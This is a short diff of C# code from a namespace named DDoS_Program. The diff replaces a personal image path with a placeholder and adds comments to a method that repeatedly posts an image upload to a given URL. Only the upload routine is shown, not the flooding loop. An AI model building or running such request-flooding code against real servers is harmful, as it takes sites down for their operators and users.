@@ -29,7 +29,7 @@ namespace DDoS_Program
         }
         private async Task SendRequest(string url, int numberOfRequest)
         {
-            string imagePath = "C:\\Users\\pasca\\Desktop\\Bilder für Nina\\MonkeyWithGreen1.png";
+            string imagePath = "Write here the path to your image"; // Path to your image.
             try
             {
                 using (var client = new HttpClient())
@@ -39,7 +39,7 @@ namespace DDoS_Program
                     using (var fs = File.OpenRead(imagePath))
                     using (var streamContent = new StreamContent(fs))
                     {
-                        formData.Add(streamContent, "file", "image.png");
+                        formData.Add(streamContent, "file", "image.png"); // Specifies the file format of the image
 
                         // Send the request with the image data.
                         HttpResponseMessage response = await client.PostAsync(url, formData);
